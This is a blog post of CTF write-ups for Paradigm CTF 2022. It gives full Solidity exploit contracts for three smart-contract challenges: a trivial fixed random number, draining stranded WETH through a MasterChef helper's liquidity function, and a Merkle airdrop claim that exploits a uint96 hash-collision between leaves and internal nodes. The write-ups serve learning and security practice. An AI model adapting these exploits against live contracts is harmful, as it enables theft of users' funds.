---
title: "My Paradigm CTF 2022 write-ups"
date: 2022-08-28 10:00
categories: [ctf-write-ups]
tags: [solidity, EVM, security, smart contracts, ctf]

---
### Paradigm CTF ?
Paradigm hosted a CTF this year named Paradigm CTF 2022. It is an online competition organized for blockchain devs, smart contract devs & hackers. It was also conducted last year in 2021. This year there were total of 23 challenges & this time around multiple different platforms were a part of this CTF. Including EVM-based, Non-EVM i.e Cairo & solana. There were also multiple difficulty level challenges & some follow-up challneges which depended on solving some other challenges.

### My Journey
I along with my team managed to take down several challaenges that I will explain here. I focused more on the EVM based challenges as I was more familair with solidity & completely ignored non-evm challenges. But, It was brought to my attention that few challenges were `sanity checks` meaning they were very very basic challenges we could have crunched in more challenge points for solving them. Sadly by that time the CTF was over! <br>

### Challenge 1: Random
This was a very simple challenge in which we had to call the the functio solve with a random value number generated by the contract. By simply inspecting the contract we could deduce the number was 4. It helped getting more comfortable with the challenge submission process.

```js
pragma solidity 0.8.15;

contract Random {

    bool public solved = false;

    function _getRandomNumber() internal pure returns (uint256) {   // chosen by fair dice roll.
        return 4;                                                   // guaranteed to be random.
    }
    
    function solve(uint256 guess) public {
        require(guess == _getRandomNumber());
        solved = true;
    }
}
```

### Challenge 2: Rescue
>I accidentally sent some WETH to a contract, can you help me?


Rescue was more of a financial exploit rather than a reverse engineering or logical-error challenge. Some WETH has been sent to the contract & we somehow need to recover them. The challnge is solved if the WETH balanceOf contract is 0.

In this challenge, we were provided with the following contracts.
1. `MasterChefHelper.sol` which handles the operations such as adding liquidity & swapping tokens.  
2. `UniswapV2Like.sol` which has the helper interface to interact with the DEX.

There are many different ways to solve this challnege here is the strategy we used.
1. Create a new token `XYZ`.
2. Buy 10 ether worth of Sushi & send it to `MasterChefHelper`.
3. Create a new pair of XYZ & Sushi. This is needed as the `swapTokenForPoolToken` function requires two token addresses. 
4. Then we call the function `swapTokenForPoolToken` it internally calls `add_liquidity` which takes the tokens i.e SUSHI & XYZ in `MasterChefHelper` & adds the liquidity. It also mints the liquidity tokens which we can burn to get the assets for ourselves.
4. The main objective of removing WETH from the contract is acheived.
```js
contract Exploit {
    WETH9 public constant weth =
        WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    UniswapV2RouterLike public constant router =
        UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    Token public xyz;
    address sushi = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    MasterChefHelper mcHelper;

    constructor(address _helper) {
        xyz = new Token();
        mcHelper = MasterChefHelper(_helper);
        ERC20Like(sushi).approve(address(router), type(uint256).max);
        ERC20Like(address(weth)).approve(address(router), type(uint256).max);
        ERC20Like(address(xyz)).approve(address(router), type(uint256).max);
    }

    function getSushi(uint256 amountIn) external {
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = sushi; //sushi
        router.swapExactTokensForTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function createPairWithSushi() external {
        router.addLiquidity(
            address(xyz),
            address(weth),
            10000 ether,
            1 ether,
            99 ether,
            0.5 ether,
            address(this),
            block.timestamp
        );

        router.addLiquidity(
            address(xyz),
            sushi,
            10000 ether,
            1 ether,
            99 ether,
            0.5 ether,
            address(this),
            block.timestamp
        );
        // the pair of the pool that got created
    }

    function getWeth() external payable {
        weth.deposit{value: msg.value}();
        // Now the contract has weth
    }

    function exploit(address _addr) external {
        ERC20Like(sushi).transfer(
            _addr,
            ERC20Like(sushi).balanceOf(address(this))
        );
        mcHelper.swapTokenForPoolToken(12, address(xyz), 0.0000001 ether, 0);
    }

    receive() external payable {}
}
```
 
### Challenge 3: Merkledrop
> Were you whitelisted?
In this challenge, we are presented with the following contracts & files.
1. `MerkleDistributor.sol` which has a `claim` function that is responsible for claiming of tokens for addresses that are whitelisted.
2. `MerkleProof.sol` that handles the logic for verifying proofs.
3. `tree.json` file that contains proofs for indexes.

Taking a quick look at `Setup.sol` file gave us the following conditions to fulfill in order to complete the challenge.
```js
function isSolved() public view returns (bool) {
    bool condition1 = token.balanceOf(address(merkleDistributor)) == 0;
    bool condition2 = false;
    for (uint256 i = 0; i < 64; ++i) {
        if (!merkleDistributor.isClaimed(i)) {
            condition2 = true;
            break;
        }
    }
    return condition1 && condition2;
}
```
1. All of the tokens must be claimed 75,000 * 1e18.
2. Atleast one of the leaf must not be claimed! which seems impossible to do. But is it ?

Okay, A few basics on this one as I spent half my day figuring out was exactly wrong!

> Merkle Tree is a data structure that has at most 2 nodes for each parent. Both of the nodes are hashed together to form the hash of the parent. This continues untill only one root is left called the merkleRoot. This is mostly used for airdropping token to users that are whitelisted.  
> 1. Each whitelisted entry would be a node with hash with amcount & it's corresponding amount for claiming.
> 2. The proof for every user is generated & provided while claiming the tokens through the contract.
> 3. This is an efficient technique as users pay gas for claiming & the underlying project does not manually have to airdrop to millions of users in multiple batch transactions!
{: .prompt-tip}

So basically, the `tree.json` file that has been provided to us is collection of users addresses & their proof so it can be verified in the merkleRoot. okay, how do we solve it ?

In `MerkleDistributor.sol` contract we can see the claim function that is very identical to normal merkleDistributor contracts. But if we look close enough we find this nifty detail.

```js
function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external {
        // ---- snip ----

        // Verify the merkle proof.
        bytes32 node = keccak256(abi.encodePacked(index, account, amount));

        // ---- snip ----
    }
```
We notice two things,
1. The function signature has the `amount` of type `uint96` instead of `uint256`.
2. The node which is of type `bytes32` which is `kecack256 hash` of `index`, `account` & `amount`.

We can try to list all `abi.encodePacked(...)` of the claiming accounts & re-construct the `node` for every entry this gives is the following format

```sh
# index(32-bytes)-account(address)-amount(uint96)
# The max value for uint96 = 0xffffffffffffffffffffffff
# Since any amount will be less than (2 ** 96 - 1) the method will padd extra zeros to fill in space for uint96 as below (The number I use is 120e18):
0x0000000000000000000000000000000000000000000000000000000000000001-0x374aeA8F8Cd3aDD133EF378A9dD6FC74878E8975-000000-410d586a20a4c00000
```
We have extra zeros, so what you may ask ? You may have looked at the `tree.json` file. There is one entry in the proofs array which has exactly the same pattern. That is index `37`. 
```plaintext
0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207b
```
What can we assume from this ? A proof entry might be a valid hash in the merkleRoot ? Let's analyze. The last 12-bytes i.e `00000f40f0c122ae08d2207b` is `72033.437049132565012603` tokens. Less than 75,000. That's fishy! Also if we deduct the amount from 75,000 it is `2966.562950867`.

If our theory is correct there should be some combination of amounts that we can use that could be added up or simply be `2699.56`. I took first 10 entries & calculated the amount in decimals. 

```sh
jq -r '.claims[].amount' tree.json | while read -r line; do cast --to-dec "$line"; done | while read -r line; do cast --from-wei "$line"; done
```
AND WE WERE RIGHT !!

```sh
176.426426426430638200
1205.252196980955435126
1012.212015703759209792
468.013680684639052982
1438.680735967842798774
1096.432701108382010527
681.817012393491087328
993.659859843097833599
2966.562950867434987397 // The madness at index 9!
2124.350787947865515262
# --- snip ---
```
Adding up both of the token amounts equates to eaxctly 75,000 tokens! In order to claim this we nee more information. We have the account for which we can claim, the amount that. For index, it is going to be the hash of index 37. And the proofs are going to be the proof of 37 from 1-5 index.

Index
 `95977926008167990775258181520762344592149243674153847852637091833889008632898`

Account
`0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A`

Amount
 `72033437049132565012603`

proofs
`0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d`
`0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde`
`0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813`
`0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c`
`0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5`

After claiming this, we can claim the index 8 which will satisfy our conditions.

```js
contract ExploitScript is Script {
    Setup setup;
    MerkleDistributor merkle;

    function setUp() public {}

    function run() public {
        setup = Setup(ADDRESS_HERE);
        merkle = MerkleDistributor(address(setup.merkleDistributor())); 

        bytes32[] memory proof = new bytes32[](5);
        proof[0] = 0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d;
        proof[1] = 0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde;
        proof[2] = 0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813;
        proof[3] = 0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c;
        proof[4] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5;

        merkle.claim(
            95977926008167990775258181520762344592149243674153847852637091833889008632898,
            0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A,
            72033437049132565012603,
            proof
        );

        bytes32[] memory proof2 = new bytes32[](6);
        proof2[0] = 0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00;
        proof2[1] = 0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3;
        proof2[2] = 0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2;
        proof2[3] = 0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a;
        proof2[4] = 0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c;
        proof2[5] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5;

        merkle.claim(
            8,
            0x249934e4C5b838F920883a9f3ceC255C0aB3f827,
            2966562950867434987397,
            proof2
        );
    }
}
```

### Solved after the CTF!
There were few other challneges that I solved sadly after CTF ended. Will share a write-up on those too!
1. Source code
2. Trapdooor
3. Trapdoooor
4. Vanity

### Wrap up!
This was the first ever CTF I participated in. It was a great experience & frustrating at the same time as I spent a a good amount of time simply looking the code for hours! Nevertheless, it was fun & we learned alot about security by breaking them.